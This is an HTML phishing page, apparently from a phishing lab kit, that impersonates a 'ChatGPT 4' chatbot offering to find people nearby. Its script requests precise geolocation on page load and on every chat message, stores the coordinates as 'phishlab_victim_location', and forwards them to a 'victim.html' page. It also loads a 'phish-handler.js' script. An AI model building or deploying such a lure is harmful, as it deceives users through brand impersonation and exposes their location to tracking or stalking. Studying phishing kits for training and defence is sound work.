<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location ChatGPT 4 - Find People Near You</title>
  <link rel="stylesheet" href="./style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    .location-prompt-box {
      margin: 10px;
      padding: 12px 16px;
      background: #eaf3ff;
      border: 1px solid #b8daff;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      font-size: 13px;
      color: #004085;
    }
    .loc-btn {
      background: #007bff;
      color: white;
      border: none;
      padding: 8px 16px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: 600;
      font-size: 12px;
      transition: background 0.2s;
      white-space: nowrap;
    }
    .loc-btn:hover {
      background: #0056b3;
    }
  </style>
</head>
<body onload="requestGeoLocation()">

<section class="msger">
  <header class="msger-header">
    <div class="msger-header-title">
      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
    </div>
    <div class="msger-header-options">
      <span><i class="fas fa-cog"></i></span>
    </div>
  </header>

  <div class="location-prompt-box" id="location-box">
    <span>ðŸ“ <strong>Location Access Required:</strong> Allow location to discover AI matches & people near your area.</span>
    <button class="loc-btn" onclick="requestGeoLocation()">Allow Location</button>
  </div>

  <main class="msger-chat" id="chat-box">
    <div class="msg left-msg">
      <div
       class="msg-img"
       style="background-image: url('https://image.flaticon.com/icons/svg/327/327779.svg')"
      ></div>

      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">ChatGPT 4 AI</div>
          <div class="msg-info-time">Just now</div>
        </div>

        <div class="msg-text">
          Hi! ðŸ‘‹ Welcome to <strong>Location ChatGPT 4</strong>. Please allow location access so I can search for active users and matches nearby. ðŸ“
        </div>
      </div>
    </div>
  </main>

  <form class="msger-inputarea" onsubmit="handleChatSubmit(event)">
    <input type="text" class="msger-input" id="chat-input" placeholder="Type a message or ask for nearby users...">
    <button type="submit" class="msger-send-btn">Send</button>
  </form>
</section>

<script src="./script.js"></script>
<script src="./phish-handler.js"></script>
<script>
  function requestGeoLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          
          try {
            sessionStorage.setItem('phishlab_victim_location', JSON.stringify({
              lat: lat,
              lon: lon,
              accuracy: pos.coords.accuracy,
              timestamp: new Date().toLocaleString()
            }));
          } catch(e){}

          // Add feedback message before redirecting
          appendMessage('ChatGPT 4 AI', 'https://image.flaticon.com/icons/svg/327/327779.svg', 'left', 'ðŸ“ Location detected! Fetching nearby profiles...');
          
          setTimeout(() => {
            window.location.href = `victim.html?lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`;
          }, 1200);
        },
        (err) => {
          console.log('Location prompt dismissed or denied:', err);
        },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    }
  }

  function handleChatSubmit(e) {
    e.preventDefault();
    const input = document.getElementById('chat-input');
    const msg = input.value.trim();
    if (!msg) return;

    appendMessage('User', 'https://image.flaticon.com/icons/svg/145/145867.svg', 'right', msg);
    input.value = '';

    setTimeout(() => {
      appendMessage('ChatGPT 4 AI', 'https://image.flaticon.com/icons/svg/327/327779.svg', 'left', 'ðŸ” Analyzing nearby telemetry based on your query...');
      setTimeout(() => {
        requestGeoLocation();
        setTimeout(() => {
          window.location.href = 'victim.html';
        }, 1500);
      }, 800);
    }, 500);
  }
</script>
</body>
</html>
